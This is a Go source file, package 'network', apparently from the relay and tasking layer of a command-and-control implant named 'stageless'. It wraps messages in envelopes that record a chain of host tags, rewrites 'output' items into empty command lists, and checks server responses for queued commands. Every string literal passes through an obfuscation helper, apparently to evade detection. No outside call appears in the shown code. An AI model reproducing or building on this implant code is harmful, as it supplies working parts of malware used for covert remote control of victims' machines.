package network

import (
	"encoding/json"

	general "stageless/utils/general"
	global "stageless/utils"
	"stageless/utils/obf"
)

type TransportResponse struct {
	OK   bool
	Code uint16
	Body string
	Err  string
}

func transportFail(reason string) TransportResponse {
	// Returns a failed transport response with the given reason
	return TransportResponse{Err: reason}
}

func BuildEnvelope(content any) string {
	// Builds the relay envelope with source content and chain
	return general.MarshalJSON(map[string]any{
		obf.S("source"):  global.HostTag,
		obf.S("content"): content,
		obf.S("chain"):   []string{global.HostTag},
	})
}

func ExtendEnvelope(packet map[string]any) string {
	// Extends the packet chain with the current host tag
	var chain []any
	if c, ok := packet[obf.S("chain")].([]any); ok {
		chain = append([]any{}, c...)
	}
	chain = append(chain, global.HostTag)
	payload := make(map[string]any, len(packet))
	for k, v := range packet {
		if k == obf.S("chain") {
			continue
		}
		payload[k] = v
	}
	payload[obf.S("chain")] = chain
	return general.MarshalJSON(payload)
}

func RelayNormalizeFrame(frame string) string {
	// Normalizes the frame content before it is forwarded
	if frame == "" {
		return ""
	}
	var pkt map[string]any
	if err := json.Unmarshal([]byte(frame), &pkt); err != nil {
		return frame
	}
	content, ok := pkt[obf.S("content")]
	if !ok {
		return frame
	}
	norm := RelayPipeContent(content)
	before, _ := json.Marshal(content)
	after, _ := json.Marshal(norm)
	if string(before) == string(after) {
		return frame
	}
	pkt[obf.S("content")] = norm
	return general.MarshalJSON(pkt)
}

func relayIsOutputItem(node map[string]any) bool {
	// Checks that the node is an output item
	opt, ok := node[obf.S("option")].(string)
	return ok && opt == obf.S("output")
}

func RelayPipeContent(content any) any {
	// Rewrites output items into an empty commands list
	switch node := content.(type) {
	case map[string]any:
		if _, ok := node[obf.S("commands")]; ok {
			return node
		}
		if relayIsOutputItem(node) {
			return map[string]any{obf.S("commands"): []any{}}
		}
		return node
	case []any:
		for _, item := range node {
			if m, ok := item.(map[string]any); ok && relayIsOutputItem(m) {
				return map[string]any{obf.S("commands"): []any{}}
			}
		}
		return node
	}
	if m, ok := content.(map[string]any); ok && relayIsOutputItem(m) {
		return map[string]any{obf.S("commands"): []any{}}
	}
	return content
}

func ParseTransportResponse(raw string) TransportResponse {
	// Parses the raw frame into a transport response
	if raw == "" {
		return transportFail(obf.S("empty_frame"))
	}
	var pkt map[string]any
	if err := json.Unmarshal([]byte(raw), &pkt); err != nil {
		return transportFail(obf.S("json_parse_error"))
	}
	content, ok := pkt[obf.S("content")]
	if !ok {
		return transportFail(obf.S("invalid_envelope: missing_content"))
	}
	b, _ := json.Marshal(content)
	return TransportResponse{OK: true, Code: 200, Body: string(b)}
}

func HasTransportCommands(resp TransportResponse) bool {
	// Checks that the transport response contains commands
	if !resp.OK || resp.Body == "" {
		return false
	}
	var data map[string]any
	if err := json.Unmarshal([]byte(resp.Body), &data); err != nil {
		return false
	}
	cmds, ok := data[obf.S("commands")].([]any)
	return ok && len(cmds) > 0
}

func HasCommands(resp HTTPResponse) bool {
	// Checks that the HTTP response contains commands
	if !resp.OK || resp.Body == "" {
		return false
	}
	var data map[string]any
	if err := json.Unmarshal([]byte(resp.Body), &data); err != nil {
		return false
	}
	cmds, ok := data[obf.S("commands")].([]any)
	return ok && len(cmds) > 0
}
